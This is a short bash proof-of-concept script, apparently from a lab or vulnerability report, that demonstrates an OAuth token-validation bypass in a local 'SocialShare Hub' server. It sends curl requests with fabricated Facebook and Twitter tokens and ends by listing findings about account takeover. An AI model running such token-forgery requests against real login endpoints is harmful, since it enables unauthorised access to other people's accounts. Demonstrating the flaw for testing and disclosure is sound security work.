#!/bin/bash

echo "üî¥ SocialShare Hub OAuth Vulnerability Demo"
echo "==========================================="
echo ""

echo "1. Testing server status..."
curl -s http://127.0.0.1:8080/status | jq '.' 2>/dev/null || curl -s http://127.0.0.1:8080/status
echo -e "\n"

echo "2. Exploiting with fake Facebook token #1..."
curl -s -X POST http://127.0.0.1:8080/api/auth/social \
  -H "Content-Type: application/json" \
  -d '{
    "provider": "facebook", 
    "access_token": "EAABwzLixnjYBOattacker_token_123456789abcdef"
  }' | jq '.' 2>/dev/null || curl -s -X POST http://127.0.0.1:8080/api/auth/social \
  -H "Content-Type: application/json" \
  -d '{
    "provider": "facebook", 
    "access_token": "EAABwzLixnjYBOattacker_token_123456789abcdef"
  }'
echo -e "\n"

echo "3. Exploiting with fake Facebook token #2..."
curl -s -X POST http://127.0.0.1:8080/api/auth/social \
  -H "Content-Type: application/json" \
  -d '{
    "provider": "facebook",
    "access_token": "EAAJ8Of8DF2IBALmalicious_app_token_zyxwvu987"
  }' | jq '.' 2>/dev/null || curl -s -X POST http://127.0.0.1:8080/api/auth/social \
  -H "Content-Type: application/json" \
  -d '{
    "provider": "facebook",
    "access_token": "EAAJ8Of8DF2IBALmalicious_app_token_zyxwvu987"
  }'
echo -e "\n"

echo "4. Testing Twitter token exploitation..."
curl -s -X POST http://127.0.0.1:8080/api/auth/social \
  -H "Content-Type: application/json" \
  -d '{
    "provider": "twitter",
    "access_token": "attacker_twitter_token_1234567890-abcdefghij_KLMNOP"
  }' | jq '.' 2>/dev/null || curl -s -X POST http://127.0.0.1:8080/api/auth/social \
  -H "Content-Type: application/json" \
  -d '{
    "provider": "twitter",
    "access_token": "attacker_twitter_token_1234567890-abcdefghij_KLMNOP"
  }'
echo -e "\n"

echo "5. Testing invalid token format (should fail)..."
curl -s -X POST http://127.0.0.1:8080/api/auth/social \
  -H "Content-Type: application/json" \
  -d '{
    "provider": "facebook",
    "access_token": "invalid_format"
  }' | jq '.' 2>/dev/null || curl -s -X POST http://127.0.0.1:8080/api/auth/social \
  -H "Content-Type: application/json" \
  -d '{
    "provider": "facebook",
    "access_token": "invalid_format"
  }'
echo -e "\n"

echo "‚úÖ Demo complete!"
echo ""
echo "üîç Key Findings:"
echo "‚Ä¢ Any Facebook token starting with 'EAA' is accepted"
echo "‚Ä¢ Any Twitter token with valid format is accepted"  
echo "‚Ä¢ Server doesn't validate token belongs to SocialShare Hub app"
echo "‚Ä¢ Attacker can use tokens from their own apps to authenticate as any user"
echo ""
echo "üí• Impact: Complete account takeover via OAuth token validation bypass"